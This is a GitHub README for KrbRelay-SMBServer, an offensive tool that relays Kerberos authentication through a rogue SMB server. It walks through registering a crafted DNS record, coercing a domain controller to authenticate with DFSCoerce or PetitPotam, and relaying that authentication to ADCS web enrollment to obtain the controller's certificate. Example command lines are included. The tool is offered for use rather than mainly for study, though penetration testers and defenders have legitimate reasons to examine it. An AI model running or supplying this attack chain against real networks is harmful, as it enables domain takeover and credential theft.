# KrbRelay-SMBServer

This krbrelay version acts as an SMB server (instead of DCOM) to relay Kerberos AP-REQ to CIFS or HTTP. <br>
It's 90% based on @cube0x0's KrbRelay:  https://github.com/cube0x0/KrbRelay<br><br>
To control the SPN for relaying, James Forshaw's *CredMarshalTargetInfo()* trick is required: https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html<br><br>

Create a DNS entry for the target server_name you want to relay the kerberos AP-REQ as: *<server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*  and mapped to your listener/relay IP. <br>
Domain users can typically perform secure DNS updates, for example you can use powershell script *invoke-dnsupdate* (https://github.com/Kevin-Robertson/Powermad) for adding a DNS entry<br><br>

Trigger the SMB authentication with a third-party tool, for example  DFSCoerce https://github.com/Wh04m1001/DFSCoerce,  PetitPotam https://github.com/topotam/PetitPotam , etc... and relay it to the attacker machine.<br><br>
Given that SMB port is 445 you have two options on the Windows attacker machine:<br>
* use a Linux box acting as redirector
* disable the SERVER serice on your Windows machine -> you can use the smb_contro.bat to perform these tasks.
<br><br>


This is a quick & dirty adaptation from original project, leaving cleanup and optimization to you  ;)
<br>
### Examples

````
# Relay the DC SMB authentication to HTTP (ADCS) web enrollment and request client certificate using a linux box redirecting to windows attacker machine on port 9999:<br>
krbRelay.exe -spn http/adcs-mylab.mylab.local -redirecthost adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -endpoint certsrv  -adcs DomainController -listenerport 9999<br>
#In another window:
DFSCoerce.exe -l adcs-mylab1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA  -t DC-2
(https://github.com/decoder-it/DFSCoerce-exe-2)

# special command line switches:
-listener: relay listener port
-redirecthost: relay server/redirector  mapped to the sepcial DNS entry <server_name>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA


For detailed usage and command line switches refer to original krbrelay tool
````
<img width="952" alt="Screenshot 2024-10-07 143939" src="https://github.com/user-attachments/assets/cc4d9796-6a26-4d99-9f5e-85de5ffe872d">

<img width="848" alt="Screenshot 2024-10-07 113416" src="https://github.com/user-attachments/assets/5a91b65b-6f87-4f4f-935d-8283f587cd81">

<img width="908" alt="Screenshot 2024-10-07 113227" src="https://github.com/user-attachments/assets/4b3a0be1-7fa7-4de6-aa5a-d645151483af">
